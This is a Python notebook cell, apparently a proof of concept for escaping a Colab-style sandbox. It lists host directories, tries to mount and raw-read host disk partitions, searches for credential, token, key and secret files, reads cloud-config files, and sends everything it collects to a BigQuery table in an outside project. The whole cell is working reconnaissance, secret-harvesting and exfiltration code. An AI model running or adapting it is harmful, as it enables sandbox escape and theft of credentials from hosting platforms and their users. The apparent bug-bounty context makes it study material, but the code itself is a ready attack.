In [ ]:
import os, subprocess
from google.cloud import bigquery
p = []
def safe(label, fn):
    try: p.append({'label':label, 'value': str(fn())[:4500]})
    except Exception as e: p.append({'label':label, 'value': f'ERR: {type(e).__name__}: {str(e)[:500]}'})

# We have HOST DISK access via /mnt/executor and /content!
safe('ls_mnt_executor', lambda: subprocess.check_output(['ls','-la','/mnt/executor'], stderr=subprocess.STDOUT, timeout=5).decode()[:3500])
safe('ls_mnt_executor_recurse', lambda: subprocess.check_output(['find','/mnt/executor','-maxdepth','4','-type','f'], stderr=subprocess.STDOUT, timeout=15).decode()[:4000])
safe('ls_var_colab', lambda: subprocess.check_output(['ls','-la','/var/colab'], stderr=subprocess.STDOUT, timeout=3).decode()[:2500])
safe('ls_var_colab_pss', lambda: subprocess.check_output(['ls','-la','/var/colab/pss'], stderr=subprocess.STDOUT, timeout=3).decode()[:2500])
safe('ls_content', lambda: subprocess.check_output(['ls','-la','/content'], stderr=subprocess.STDOUT, timeout=3).decode()[:2500])

# Try mounting sda1 ourselves to access workbench/cloud-config.yaml
os.makedirs('/tmp/host', exist_ok=True)
r = subprocess.run(['mount','-t','ext4','-o','ro','/dev/sda1','/tmp/host'], capture_output=True, text=True, timeout=5)
p.append({'label':'mount_sda1_ext4', 'value': f'rc={r.returncode} stderr={r.stderr[:300]} stdout={r.stdout[:200]}'})
safe('ls_tmp_host_after_mount', lambda: subprocess.check_output(['ls','-la','/tmp/host'], stderr=subprocess.STDOUT, timeout=3).decode()[:2500])

# Try sda3 (alt root partition on Chromium OS)
os.makedirs('/tmp/host3', exist_ok=True)
r3 = subprocess.run(['mount','-t','ext2','-o','ro','/dev/sda3','/tmp/host3'], capture_output=True, text=True, timeout=5)
p.append({'label':'mount_sda3_ext2', 'value': f'rc={r3.returncode} stderr={r3.stderr[:300]}'})
safe('ls_tmp_host3', lambda: subprocess.check_output(['ls','-la','/tmp/host3'], stderr=subprocess.STDOUT, timeout=3).decode())

# Direct raw read of sda1 (proves host disk read capability)
safe('dev_sda1_head_4k_hex', lambda: open('/dev/sda1','rb').read(4096).hex()[:3000])
safe('dev_sda1_size', lambda: os.path.getsize('/dev/sda1') if os.path.exists('/dev/sda1') else os.stat('/dev/sda1').st_size)

# Look for keys/secrets/tokens on host disk
safe('grep_workbench_cloud_config_on_host', lambda: subprocess.check_output(['find','/mnt/executor','/var/colab','/content','-maxdepth','5','-name','cloud-config*','-o','-name','*.token','-o','-name','*.key','-o','-name','*credentials*','-o','-name','*secret*'], stderr=subprocess.STDOUT, timeout=15).decode()[:4000])

# Read /mnt/executor specifically — this IS the host's stateful partition contents
safe('mnt_executor_workbench', lambda: subprocess.check_output(['find','/mnt/executor','-maxdepth','3','-type','d'], stderr=subprocess.STDOUT, timeout=10).decode()[:3500])

# Try reading the cloud-config from where it ACTUALLY is via the mounted partition
for candidate in ['/mnt/executor/workbench/cloud-config.yaml',
                  '/var/colab/pss/workbench/cloud-config.yaml',
                  '/mnt/executor/cloud-config.yaml',
                  '/content/workbench/cloud-config.yaml']:
    safe(f'read_{candidate[:60]}', lambda c=candidate: open(c).read()[:4000])

client = bigquery.Client(project='bq-ssrf-453453')
table_id = 'bq-ssrf-453453.injected_proof.NBEX_HOST_DISK_READ'
schema = [bigquery.SchemaField('label','STRING'), bigquery.SchemaField('value','STRING')]
client.create_table(bigquery.Table(table_id, schema=schema), exists_ok=True)
errs = client.insert_rows_json(table_id, p)
print('rows', len(p), 'errors', errs)
